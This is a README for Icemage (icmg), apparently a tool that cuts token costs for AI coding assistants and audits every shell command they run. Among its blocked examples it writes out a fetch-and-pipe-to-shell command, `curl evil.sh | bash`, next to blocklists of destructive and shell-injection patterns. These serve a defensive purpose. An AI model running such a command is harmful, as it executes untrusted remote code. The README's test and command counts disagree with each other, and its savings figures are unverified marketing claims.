<p align="center">
  <img src="assets/logo.svg" alt="Icemage" width="160"/>
</p>

# Icemage <sub><sup>(`icmg`)</sup></sub>

[![release](https://img.shields.io/github/v/release/ncmonx/icm-graph)](https://github.com/ncmonx/icm-graph/releases)
[![downloads](https://img.shields.io/github/downloads/ncmonx/icm-graph/total)](https://github.com/ncmonx/icm-graph/releases)
[![last-commit](https://img.shields.io/github/last-commit/ncmonx/icm-graph)](https://github.com/ncmonx/icm-graph/commits/main)
[![tests](https://img.shields.io/badge/tests-68%2F68%20passing-brightgreen)](#)
[![mcp tools](https://img.shields.io/badge/MCP%20tools-28-blueviolet)](#)
[![commands](https://img.shields.io/badge/CLI%20commands-88%2B-blue)](#)
[![license](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
[![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/ncmonx/icm-graph/badge)](https://securityscorecards.dev/viewer/?uri=github.com/ncmonx/icm-graph)
[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/12818/badge)](https://www.bestpractices.dev/projects/12818)
[![sponsor](https://img.shields.io/badge/sponsor-GitHub-ea4aaa?logo=github-sponsors)](https://github.com/sponsors/ncmonx)
[![ko-fi](https://img.shields.io/badge/Ko--fi-tip-ff5e5b?logo=ko-fi)](https://ko-fi.com/ncmonx)

> **Stop burning tokens. Stop losing context. Ship faster.**

A single binary that makes Claude Code, Cursor, and every other AI coding assistant **70–90% cheaper** to run — without dumbing them down.

If you've ever watched 30K tokens evaporate on a single file read, paid for "thinking" you didn't need, or re-explained the same project context after `/clear` for the fifth time today — this is for you.

---

## 🛡️ What's new in v0.48.0 — Command Gateway: Total AI Action Control

> **Every shell command Claude runs is now audited and controlled. No exceptions.**

icmg v0.48.0 introduces the **Command Gateway** — a mechanical enforcement layer that makes icmg the sole gatekeeper for all AI-executed shell commands. Claude cannot run a single command outside icmg's control. Not git. Not curl. Not your build tools. Nothing.

| What Claude used to do | What Claude does now |
|---|---|
| `cmake --build build` ❌ direct shell | `icmg run "cmake --build build"` ✅ audited |
| `git push private feat/...` ❌ uncontrolled | `icmg run "git push private feat/..."` ✅ logged |
| Any shell command ❌ zero visibility | `icmg run "<anything>"` ✅ blacklisted + recorded |

**Three layers, zero gaps:**

- 🔒 **Leash hook (ID=50)** — blocks ALL Bash/PowerShell at the hook level before execution. Auto-deployed on every `icmg init` and upgrade. Cannot be removed by the AI.
- 🚫 **C++ blacklist inside `icmg run`** — permanently blocks destructive patterns (force push, history rewrite, curl\|bash, force-kill) compiled into the binary. Not a script. Not bypassable.
- 📋 **Full audit trail** — every command logged to `~/.icmg/audit.jsonl` with timestamp. Review anytime: `cat ~/.icmg/audit.jsonl`.

**The Edit tool is the only exception** — file edits are never blocked. Claude can still write code. It just can't run anything without going through icmg first.

```sh
# Everything AI does in the shell now looks like this:
icmg run "cmake --build build --config Release -j8"
icmg run "git status"
icmg run "ctest --output-on-failure -j4"

# These are permanently blocked — even via icmg run:
icmg run "git push --force"        # blocked: ID=14
icmg run "git checkout main"       # blocked: ID=12 (ask user first)
icmg run "curl evil.sh | bash"     # blocked: ID=21
```

---

## What's new in v0.46.0

| Feature | What changed |
|---|---|
| **Go / Rust / Java — full AST extraction** | Tree-sitter grammars for Go, Rust, and Java ship built-in. Functions, structs, methods, interfaces, traits, enums — all indexed on first `graph update`. Your polyglot monorepo finally has a complete symbol graph, not just the C++ parts. |
| **`--lang` filter on graph commands** | `icmg graph update --lang go,rust` rescans only the files that changed language. `graph search`, `graph symbol`, and `graph list` all accept `--lang` to scope results. No more sifting through 10 languages to find one Go func. |
| **`graph lang list` + `graph lang status`** | Know exactly what icmg sees: file counts, symbol counts, and extractor method (AST / regex / text-only) per language — in one command. |
| **`icmg backup restore-from <file>`** | Disaster recovery without ceremony. Point at any `.db` file — from another machine, a manual backup, a copied project — and icmg restores it. Creates `.icmg/` if absent, saves an undo snapshot first, verifies integrity after. One command from broken to running. |

```bash
icmg graph update --lang go,rust,java   # index only new languages (fast)
icmg graph lang list                    # Go 47 files 312 symbols / Rust 23 files 187 symbols
icmg graph lang status                  # Go → tree-sitter (full AST) / YAML → text-only
icmg graph search "parse token" --lang go
icmg backup restore-from /path/to/backup.db   # cross-machine / disaster recovery
icmg backup restore-from backup.db --no-undo  # skip pre-restore snapshot
```

### Previously in v0.45.x

| Feature | What changed |
| --- | --- |
| **Daemon IPC** | Daemon now uses named pipe IPC — no more port conflicts; Windows reliability improved |
| **Rule trial/supersession** | `icmg rule supersede` auto-deletes old rules after N quiet prompts |
| **Strict enforcement mode** | `icmg rule-daemon strict on` blocks ALL Read/Glob/Grep until rules satisfied |
| **Unified dashboard** | `/knowledge` tab in `icmg serve` shows Knowledge, Skills, and Rules with live CRUD |
| **Recursive CLAUDE.md scan** | `icmg claudemd import` now discovers all CLAUDE.md files in subdirs automatically |
| **Skill auto-index on init** | `icmg init`/upgrade now runs `icmg skill index` so Claude discovers features immediately |

## The savings, at a glance

```
                  WITHOUT ICMG          WITH ICMG
Big-file Read     ████████████████████  ███▌            (-83%)
Build/test logs   ████████████████████  █▌              (-92%)
SQL/table dump    ████████████████████  ▏               (-99%)
Thinking pass     ████████████████████  █▌              (-92%)
Stable preamble   ████████████████████  ██              (-90% via cache)
Repeat queries    ████████████████████  ▏               (-100% local cache)
Bulk batch ops    ████████████████████  ██████████      (-50% Anthropic batch)
HTML/PDF fetch    ████████████████████  ██▌             (-87% reduce+cache)
OCR vs vision     ████████████████████  ██              (-90% on text-heavy)
```

```
Combined-stack on a typical turn:    ███▏  85–95% reduction (compounded)
```

These ranges come from real measurements. Each layer alone is small. Stacked, the headline number lands.

---

## What it does (single-page tour)

```
                ┌───────────────────────┐
   YOUR TASK ──▶│  icmg pack "<task>"   │── filtered context bundle
                └────────────┬──────────┘     (memory + graph + diff)
                             │
                             ▼
                ┌───────────────────────┐
                │   28 MCP tools        │── Claude Code / Cline / Continue
                │   recall, store, …    │
                └────────────┬──────────┘
                             │
                             ▼
                ┌───────────────────────┐
                │  Hooks intercept      │── Read 100-line cap
                │  Read / Bash / Edit   │── Bash 8KB cap, ANSI strip
                │  Glob / Grep / Web    │── Glob top-50, WebFetch 4KB
                └────────────┬──────────┘
                             │
                             ▼
                ┌───────────────────────┐
                │   Auto-compress       │── reversible glossary on
                │   (≥3KB pack)         │   pack output
                └────────────┬──────────┘
                             │
                             ▼
              SAVINGS DASHBOARD + RECEIPTS + COMPLIANCE TRACKING
```

| Pain | Icmg fix |
|---|---|
| Big files inflate every prompt | Surgical context bundles — only what the task actually needs |
| Noisy command output drowns the model | Output filtering tuned per command type (ANSI strip, dedup ×N, blank collapse) |
| Same bug solved twice | Persistent memory that surfaces past fixes when they apply |
| `/clear` wipes hard-won context | Snapshots + auto-distill of session decisions |
| Models "think" 8K tokens for a one-line rename | Intent-aware directives + caveman mode kill thinking outright |
| Re-sending the same project preamble every turn | Long-lived prompt-cache markers — pay once, reuse cheap |
| 30K tokens of logs / diffs / dumps | Lossless context compression with reversible round-trips |
| AI keeps trying the same broken approach | Anti-pattern memory (`icmg fail`) — failures become guardrails |
| AI "forgets" your CLAUDE.md instructions | Hard-enforcement hooks block disallowed reads/fetches |
| Native `Read` bypasses everything | Read cap-and-allow hook caps at 30 lines via `updatedInput.limit` + icmg-context overlay |
| Same task already solved in another project | `icmg cross-recall` federates memory across all registered projects |
| DB grows unbounded over months | `icmg cron install` autopilots weekly prune (Windows schtasks / POSIX cron) |
| Wrong zone wastes BM25 IDF | Auto-zone detect from task keywords (10 zones); no manual `--zone X` |

Each one is a few percent. Stack them and you get the headline number.

---

## Quick start

```bash
# Build
cmake -B build && cmake --build build

# Or grab the release binary
# https://github.com/ncmonx/icm-graph/releases

# Bootstrap a project (installs the right hooks for your AI agent)
icmg init

# Try one of these
icmg pack "fix the login bug"          # surgical context bundle
icmg run npm test                      # noise-filtered build output
icmg compress < big.log                # cut tokens on dumps + diffs
icmg pack "rename foo.ts"              # auto-think on; thinking off when task is simple
icmg context src/auth.ts --symbol parseToken  # one function body, 80%+ cut vs full file
icmg run --stream npm test             # real-time output + noise filter summary at end
icmg context src/auth.ts --lines 60-95 # surgical read; replaces native Read offset/limit
icmg fail store "jwt refresh" "X" "Y"  # record failed approach so AI doesn't repeat
icmg savings                           # see what you saved (console / --html)
```

That's it. Nothing else to configure.

---

## Headline numbers (measured)

```
LAYER                       SAVING            SOURCE
─────────────────────────────────────────────────────────────────────
Big-file Read           60–80% smaller       file slice, 100-line cap
Build/test logs         80–95% smaller       icmg run filter pipeline
SQL/table dumps         95–99% smaller       per-tool shrink strategy
Thinking overhead       50–90% off           --no-think + caveman
Stable preamble         90% off              prompt-cache markers
Repeat queries          100% off             tool_call_cache (5min TTL)
Bulk operations         50% off              Anthropic Batch API emit
HTML/PDF fetch          70–90% off           icmg fetch reduce + cache
Screenshot OCR          90–95% off           icmg ingest pytesseract
Read repeat-dedup       ~100% on dup         30-min sliding window
Pack on-repeat          60–97% smaller       icmg pack --diff
Symbol-slice context    80%+ per lookup      icmg context --symbol (one fn, not whole file)
Live stream dedup       real-time lines      icmg run --stream (filter summary at end)
File copy no-output    97% per write        icmg copy --from (zero output tokens generated)
Filter ANSI/dedup       30–60% on noisy CLI  npm/cargo/pnpm output
Caveman mode            ~75% on responses    fragment-style directive
─────────────────────────────────────────────────────────────────────
COMBINED ON TYPICAL TURN          ≈ 85–95%
```

Token-cost savings at scale: roughly **\$0.10 per non-trivial Claude turn**, hundreds of dollars a month for active users.

---

## Coverage dashboard

`icmg savings` shows where the savings actually came from:

```
icmg savings — last 30 days
================================================================

  Command filter (icmg run)             67 calls       16.6K  →  16.2K   (2% saved)
  Compression  (icmg compress)           1 calls       5.0K   →  5.0K    (0% saved)
  Thinking     (--no-think)             21 calls       31.5K  →  7.5K    (76% saved)
  Pack receipts  (memory+graph)         15 calls       9.2K   →  9.2K
  Strict denials (read/web/bash)         8 calls       12.0K  →  0       (100% saved)
  Fetch cache    (icmg fetch)            3 hits        7.5K   →  0       (100% saved)
  Image OCR cache(icmg ingest)           2 hits        4.0K   →  0       (100% saved)
----------------------------------------------------------------
  TOTAL                                117 calls       86K    →  38K     (56% saved)

Cost without icmg: $0.50  (input $0.03 / output $0.47)
Cost with    icmg: $0.13  (input $0.02 / output $0.11)
You saved:         $0.37  (63.6%)

Real session tokens: 2195587  (icmg-covered 86K = 4%, outside 2.1M)
Strict-mode denials in window: 8
  → each block redirected agent to icmg context/fetch
```

`Real session tokens` row reads the live Claude transcript — surfaces the gap between icmg-instrumented ops and actual context-window fill.

---

## Highlights

```
ONE BINARY            ▸ ~30 MB Windows .exe, no node_modules / venv / Docker
LOCAL-FIRST           ▸ Per-project SQLite. Never phones home
MCP SERVER            ▸ 28 tools — recall, store, graph, sync, fetch, batch …
                        Plugs into Claude Code, Cline, Continue, anything MCP
PROJECT FEDERATION    ▸ icmg cross-recall — "this was done in project X" lookup
                        across all registered projects (memory + receipts)
AUTOPILOT HYGIENE     ▸ icmg cron install — weekly memory prune (auto/session/
                        fail/correction rotation + telemetry trim) zero-touch
AUTO-ZONE             ▸ Pack infers zone from keywords (10 zones); sharper IDF
                        without manual flag — auth/db/graph/imem/tkil/mcp/ui/
                        cli/hooks/compress
DASHBOARD             ▸ icmg serve → http://127.0.0.1:8080/
AST-AWARE             ▸ tree-sitter for C/C++/Python/TypeScript/Go/Rust/Java
                        regex fallback for the rest; `--lang` filter on
                        `graph update` / `graph search` / `graph symbol`
TEAM-FRIENDLY         ▸ Memory + graph share via git-tracked JSONL snapshots
IMAGE-AWARE           ▸ Local OCR for screenshots; 90%+ vs vision API
HARD ENFORCEMENT      ▸ Hooks block native Read/WebFetch when icmg has it
SELF-REPAIR           ▸ DLL sha256 auto-rollback, lock recovery, pending-restart
SELF-PROTECTION       ▸ Atomic snapshots (24h/7d/4w/6m pyramidal) +
                        ping-pong dual-mirror (2× live, instant failover) +
                        7-stage graph integrity check + auto on every upgrade
HOT-CONTEXT CACHE     ▸ Re-issue same icmg context/compress within session →
                        ~5ms cache hit (15-30× cold→hot). Boosts hot files
                        in graph rank automatically. Self-invalidating on edit
SELF-MAINTENANCE      ▸ icmg maintain run auto-detects HEAVY/IDLE state →
                        prune chain → keeps only active graph in idle mode
DRIFT GATE            ▸ icmg drift pin/check — pinned decisions get 10× recall
                        boost; every prompt matched against anchors;
                        contradictions flagged BEFORE the model commits
SENTINEL WATCHDOG     ▸ icmg sentinel — 15-min health checks; auto-prunes when
                        disk/cache/audit growth crosses thresholds; halts cold
                        at ≥3 reactions/hour (loop-safe by design)
SHADOW AUTO-UPGRADE   ▸ icmg shadow-upgrade — daily background poll of GitHub;
                        sha256-verified download to ~/.icmg/shadow/<version>/;
                        atomic swap on next invocation. Chrome-style. No
                        teammate left behind on stale features. Pin/opt-out
                        available
AUDIT TRAIL           ▸ chain-signed log of every backup/restore/failover/
                        sentinel reaction. icmg repair-history verify walks
                        the chain — tamper-detectable
SYMBOL SLICE          ▸ icmg context <file> --symbol <Name> — one function body,
                        not the whole module. 80%+ token cut vs full-file read.
                        Substring + case-insensitive match. Precision surgical
SESSION DEDUP         ▸ Recall auto-suppresses nodes already returned this session
                        — identical results stop flooding multi-turn context.
                        --no-dedup to override. Zero latency (in-memory set)
LIVE STREAM FILTER    ▸ icmg run --stream — real-time line-by-line subprocess
                        output with filter summary appended at end. No buffering
                        lag; full filter context preserved for summary accuracy
CONTEXT GRAPH         ▸ CLAUDE.md sections auto-imported as BM25-searchable nodes.
                        ~93% less context on session start — only relevant sections
                        injected per prompt. No manual CLAUDE.md load needed
SKILL STORE           ▸ Skill .md files indexed into the graph (tier=skill).
                        Matching skills suggested automatically per prompt via hook.
                        Never miss an applicable skill again. icmg skill index
RULE ENFORCEMENT      ▸ Persistent enforcement daemon: rules stored in DB, not hooks.
                        Read/Glob/Grep calls evaluated at 2-5 ms (10x faster).
                        Files >=500 lines blocked; focused alternative suggested
KNOWLEDGE BROWSER     ▸ icmg knowledge list/add/edit/delete — full CRUD on context
                        graph. HTML dashboard at icmg serve /knowledge.
                        Toggle nodes active/inactive without deleting
APACHE-2.0            ▸ License preserved on releases
```

---

## When to use which command

| Situation | Run |
|---|---|
| Starting a task | `icmg pack "<task>"` — one bundle, not 5–10 reads |
| Need a single file | `icmg context <file>` — surgical, not full Read |
| Need lines 60–95 | `icmg context <file> --lines 60-95` — replaces Read offset/limit |
| Any noisy command | `icmg run <cmd>` — filtered output |
| PR review | `icmg diff-summary` — symbol-grouped, not raw diff |
| Big text input | `icmg compress` — cut tokens, reverse-able |
| Past decisions | `icmg recall "<query>"` — surfaces what you already learned |
| Failed approach | `icmg fail store/recall` — anti-pattern memory |
| Same task in another project | `icmg cross-recall "<prompt>"` — federate across registered projects |
| Auto-prune old memory weekly | `icmg cron install` — Win schtasks / POSIX cron, zero-touch |
| Auto-zone for sharper recall | `icmg pack "<task>"` — infers `auth`/`db`/`graph`/etc. from keywords |
| AI ignored CLAUDE.md | `icmg strict on` — hooks enforce rules at harness level |
| Full LLM pipeline | `icmg agent "<task>"` — pack + cache + directives + retry |
| Bulk Anthropic | `icmg batch --task ...` — 50% via Batch API |
| Download URL | `icmg fetch <url>` — reduced + cached (70-90% off) |
| Screenshot | `icmg ingest screenshot.png` — OCR text-only payload |
| Team share | `icmg sync init/push/pull` — git-tracked JSONL |
| Audit savings | `icmg savings` — console / `--html` / `--json` |
| Real session tokens | `icmg context-budget` — covers ALL sources |
| What changed | `icmg whats-new` — release notes after `update` |
| Visual graph | `icmg serve` — embedded HTTP dashboard |
| **Index specific language** | `icmg graph update --lang go` — re-scan only Go files; combine: `--lang go,rust,java` |
| **DB safety net** | `icmg backup snapshot` / `icmg backup restore latest` / `icmg backup restore-from <file>` — atomic, schema-checked; cross-project restore supported |
| **Instant failover** | `icmg mirror failover` — swaps in valid mirror in seconds |
| **Self-clean heavy/idle DB** | `icmg maintain run` — auto-detects state, chains prune + integrity |
| **Repair broken graph** | `icmg graph integrity --fix` — 7-stage check + targeted repair |
| **Inspect cache layer** | `icmg cache stats / list / prune` — see what's hot |
| **Pin a decision** | `icmg drift pin --topic X --stance Y` — pinned memory wins recall 10× |
| **Check prompt drift** | `icmg drift check "<prompt>"` — surfaces conflicts with pinned anchors |
| **Watchdog health** | `icmg sentinel run` — auto-prunes disk/cache; halt-safe loop guard |
| **Background upgrade** | `icmg shadow-upgrade check` — daily auto-poll; pin/rollback supported |
| **Audit trail** | `icmg repair-history tail / verify` — chain-signed event log |

Run `icmg --help` for the full list of 82+ subcommands. Each has its own `--help`.

> More layers in progress. Concrete designs not published.

---

## Install

**Windows (recommended):** download the latest release, drop `icmg.exe` somewhere on `PATH`. The bundled DLLs live next to it. Done.

**Build from source:**

```bash
git clone https://github.com/ncmonx/icm-graph
cd icm-graph
cmake -B build && cmake --build build
# Optional capabilities (turn on what you want)
cmake -B build -DICMG_USE_TREESITTER=ON -DICMG_USE_ONNX=ON
```

Optional capabilities are exactly that — optional. Default build runs everywhere with zero external dependencies beyond a C++17 compiler.

---

## How it pays off in practice

After a few days of use you'll notice:

```
Day 1   ▸ Sessions get visibly longer before /compact fires
Day 3   ▸ Recurring questions answer themselves from memory
Day 7   ▸ Big PR reviews stop blowing the context window
Day 14  ▸ Cache hit-rate climbs as you settle into patterns
Day 30  ▸ Your monthly Claude bill stops scaring you
```

Memory recall sharpens over time. Snapshot restore gets faster. Compression learns your codebase's repeated terms. The system compounds.

---

## Architecture (one screen)

```
                       ┌─────────────────────────────────────┐
                       │           icmg.exe (single binary)   │
                       └─────────────────────────────────────┘
                                       │
        ┌──────────────────────────────┼──────────────────────────────┐
        │                              │                              │
   ┌─────────┐                  ┌──────────────┐               ┌──────────────┐
   │   CLI   │                  │  MCP Server  │               │ HTTP Server  │
   │ 70+ cmd │                  │  (stdio)     │               │ :8080 read   │
   └────┬────┘                  └──────┬───────┘               └──────────────┘
        │                              │
        ▼                              ▼
   ┌────────────────────────────────────────────┐
   │   Core: SQLite WAL · BM25 · embedder       │
   │         tree-sitter · pytesseract sidecar  │
   └────────────────────────────────────────────┘
        │
        ▼
   ┌────────────────────────────────────────────┐
   │  ~/.icmg/global.db        — registry        │
   │  <proj>/.icmg/data.db     — per-project     │
   │  ~/.icmg/*.flag           — caveman/strict  │
   │  ~/.icmg/*-log.{jsonl|txt}— receipts        │
   └────────────────────────────────────────────┘
```

---

## Security

Local-first design with explicit boundaries:

- **Update integrity:** every release ships a SHA256 sidecar per binary. `update --apply` verifies before swap; mismatch auto-rollbacks. Bypass via `--skip-verify`.
- **Per-DLL SHA256:** 6 bundled DLLs (onnxruntime / providers-shared / tree-sitter / wasmtime / zstd / winpthread) verified after install; auto-restore from `.bak` on mismatch.
- **URL sanitization:** `icmg fetch` validates URLs against a shell-metacharacter blocklist (`"$\;|&<>` newlines control chars) before any shell-out.
- **HTTPS-only** for self-update + fetch.
- **Parameterized SQL** queries throughout (no SQL injection on store/recall/import).
- **No telemetry phoned home** — the binary makes network calls only when you invoke `update`, `fetch`, `embed` (Python sidecar), or `whats-new`.
- **Per-project DB** is plaintext SQLite. If you store secrets as memory, treat the DB file as sensitive (filesystem permissions remain the boundary).
- **Hooks** modify `.claude/settings.local.json` only on `icmg init`. Review before opt-in.

Open caveats:
- Image OCR runs Python `pytesseract` + `Pillow` subprocess; respect those projects' CVE history when ingesting untrusted images.
- MCP stdio is unauthenticated (local-only threat model).
- DB encryption opt-in still in design (key-recovery UX risk).

---

## Self-repair

icmg is designed to recover from common failure modes on its own. The trade-off: recovery takes a few extra seconds in exchange for safety.

| Situation | What happens |
|---|---|
| Update target binary locked (Windows) | Detached helper waits for the running process to exit, then performs the swap on the next invocation — no manual restart needed |
| Update integrity mismatch (sha256) | Aborts before swap, keeps the previous binary in place |
| DLL bundle drift after upgrade | Per-DLL sha256 verify catches mismatches; auto-rollback restores `.bak` |
| Stale lockfile from killed process | Auto-detected via PID liveness probe and cleaned up |
| Pending upgrade interrupted | Marker file resumes the swap on the next `icmg` invocation in any new terminal |
| Hook scripts drift after upgrade | `update --apply` re-runs `init --install-hooks --force` automatically |
| Telemetry tables grow unbounded | `icmg memory prune-telemetry` reclaims space; `prune-old --topic 'auto:%'` rotates auto-grown topics |
| DB schema lag | Migrations apply automatically on next open; backward-compatible |
| Project graph stale | `icmg context` auto-scans single file inline if not yet indexed |
| TS/MD/JSON files missing from graph | Auto-detected by extension and indexed on next access |
| **DB corruption detected** | `icmg mirror failover` swaps in newest valid mirror in seconds; primary quarantined for forensics; audit-logged |
| **No mirror available** | `icmg backup restore latest` rolls back to most recent atomic snapshot; auto-undo created first |
| **Project copied to new location (DB missing)** | `icmg backup restore-from .icmg/backups/<id>.db` — restores from explicit file; creates `.icmg/` dir if absent; `--no-undo` skips pre-restore snapshot |
| **DB heavy (>100MB or >50K rows)** | `icmg maintain run` chains telemetry-prune → topic-aged prune → decay → consolidate → integrity check |
| **Project idle (no activity >24h)** | `icmg maintain run --idle-mode` soft-deletes auto/session/cache rows below importance 2; graph + pinned memory untouched |

**Always-on protection (auto-armed on `icmg init` and every upgrade):**

| Layer | Cadence | Disk cost | Purpose |
|---|---|---|---|
| Snapshot history | hourly | pyramidal (24h/7d/4w/6m) | Time-travel recovery |
| Dual mirror | 15 min | 2× live | Instant failover |
| Hygiene maintain | 6 h | n/a | Bounded growth |
| Graph integrity | within maintain | n/a | Drift detection |

Most recovery paths take 1–3 seconds. A few (network re-fetch on integrity mismatch, helper-script wait for exit) can take 10–30 seconds. Safety is prioritized over speed — every recovery preserves the previous good state via `.bak` files so manual rollback is always available.

Run `icmg health` any time to confirm everything is in order.

---

## Honest limits

```
✓  Windows is primary target. Linux / macOS work but tested less.
✓  Opinionated. Fight the conventions and you fight the tool.
✓  Won't make a bad prompt good — makes a good prompt cheap.
✓  Some optional capabilities require one-time DLL download (binary tells you).
✓  Compression is semantic glossary — model still must understand aliases inline.
✓  Real session coverage starts ~50%; climbs as more hooks fire on subsequent ops.
```

See [CHANGELOG.md](CHANGELOG.md) for the full ship history (35+ releases, atomic per-task).

---

## Support

Solo maintainer, no VC backing. If icmg saved you tokens, consider supporting development:

- 💚 [GitHub Sponsors](https://github.com/sponsors/ncmonx) — recurring or one-time
- ☕ [Ko-fi](https://ko-fi.com/ncmonx) — quick tip, no signup

Every contribution funds priority feature work and faster bug response.

---

## License

Apache 2.0. Use it however you want. Attribution appreciated, not required.

See [LICENSE](LICENSE) and [NOTICE](NOTICE).

---

## Other docs

- `CHANGELOG.md` — every shipped release, outcome-first
- `AGENTS.md` — how to wire icmg into your AI agent's instruction set
- `COMMANDS.md` — full CLI reference (70+ commands)
- `CLAUDE.md` — Claude Code-specific notes
- `docs/plans/` — phase plans + open backlog (Phase 69)

---

**TL;DR:** stop paying full price for AI coding sessions you don't need to. Drop `icmg` in your `PATH`, run `icmg init`, get back to shipping.

```
                            ◆ icemage
                  context · memory · graph
              52/52 tests · 28 MCP · 72+ cmds
            cross-project federation · autopilot hygiene
```
